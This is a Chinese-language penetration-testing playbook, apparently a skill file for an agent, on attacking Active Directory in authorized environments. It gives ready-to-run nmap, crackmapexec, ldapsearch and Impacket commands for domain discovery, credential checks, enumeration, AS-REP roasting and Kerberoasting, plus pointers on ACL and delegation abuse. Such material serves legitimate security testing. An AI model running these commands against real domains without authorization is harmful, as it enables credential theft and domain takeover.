---
name: active-directory-attack
description: Active Directory 入口识别、枚举与常见攻击面（Kerberos/LDAP/ACL）
version: 1.0.0
---

# Active Directory 攻击方法（授权环境）

## 适用场景
- 目标网络存在域控/域成员（常见端口：53/88/389/445/464/636/3268/3389/5985）
- 已拿到域用户凭证或可获取到一批用户名
- 需要从“可登录”走到“可横向/可提权/可控域资产”的路径

## 关键原则
- 先确认域信息（域名、DC、站点、策略），再进行针对性枚举
- 先做低噪声枚举与权限路径，再做高噪声动作（喷洒/爆破/中继）
- 所有攻击动作需要授权并评估账号锁定策略

## 1. 识别域环境与域控
```bash
nmap -Pn -T4 -p 53,88,389,445,464,636,3268,3269 --open <target_or_range>
nmap -Pn -T4 -p 389,636 --script ldap-rootdse <dc_ip>
```

SMB/NTLM 指纹（经常可拿到域名/主机名）：
```bash
nmap -Pn -p 445 --script smb-os-discovery,smb2-time <target>
nmap -Pn -p 3389 --script rdp-ntlm-info <target>
```

## 2. 凭证有效性与资产面（低噪声）
```bash
crackmapexec smb <range_or_target> -u <user> -p '<pass>' --continue-on-success
crackmapexec winrm <range_or_target> -u <user> -p '<pass>' --continue-on-success
```

拿到可登录面后，优先汇总：
- 哪些主机可 SMB 登录、是否本地管理员
- 哪些主机可 WinRM 登录（通常更利于后续远程操作）
- 哪些主机暴露 RDP 且可登录

## 3. LDAP 枚举（结构信息）
用已知凭证枚举用户/组/计算机/关键属性（示例模板，按环境调整 baseDN）：
```bash
ldapsearch -x -H ldap://<dc_ip> -D '<domain>\\<user>' -w '<pass>' -b 'DC=example,DC=com' '(objectClass=user)' sAMAccountName
ldapsearch -x -H ldap://<dc_ip> -D '<domain>\\<user>' -w '<pass>' -b 'DC=example,DC=com' '(objectClass=computer)' dNSHostName
ldapsearch -x -H ldap://<dc_ip> -D '<domain>\\<user>' -w '<pass>' -b 'DC=example,DC=com' '(objectClass=group)' cn
```

## 4. BloodHound 路径分析（推荐）
- 目标：把“当前凭证”到“高价值资产/域管”的可达路径可视化（ACL、委派、会话、组成员等）
- 数据采集可通过多种方式完成：Windows 采集器（SharpHound）或同类采集方案
- 建议先采集最小集合：会话、组、ACL、SPN、委派

证据建议：导出查询结果图、关键边（例如 GenericAll/WriteDacl/MemberOf）与对应对象 DN。

## 5. Kerberos 相关攻击面（常见）

### 5.1 AS-REP Roasting（无需预认证账户）
适用：存在 `Do not require Kerberos preauthentication` 的用户。

工具链（示例）：Impacket GetNPUsers
```bash
GetNPUsers.py <domain>/ -dc-ip <dc_ip> -usersfile users.txt -no-pass
```

### 5.2 Kerberoasting（SPN 服务账户）
适用：可请求服务票据的域用户，目标是服务账户的离线口令恢复。

工具链（示例）：Impacket GetUserSPNs
```bash
GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <dc_ip> -request
```

## 6. ACL/委派/凭证攻击（方向提示）
- ACL：GenericAll/GenericWrite/WriteDacl/WriteOwner/AllExtendedRights 常是“直达提权边”
- 委派：Unconstrained/Constrained/RBCD（基于资源的受限委派）常用于横向与提权
- 凭证：共享目录、脚本、GPP、备份、注册表/日志中泄露的凭证线索

## 7. 报告与证据留存
- 域信息：域名、DC、站点（如能获取）、关键策略（锁定阈值/密码策略）
- 枚举结果：用户/组/计算机数量与关键高价值对象清单（DC、CA、文件服务器、跳板机）
- 攻击路径：BloodHound 路径截图与每一跳的可复现命令/证据
- 风险与修复：最小权限、禁用弱委派、清理过期 SPN/服务账号、收敛 WinRM/RDP、加强审计与分段

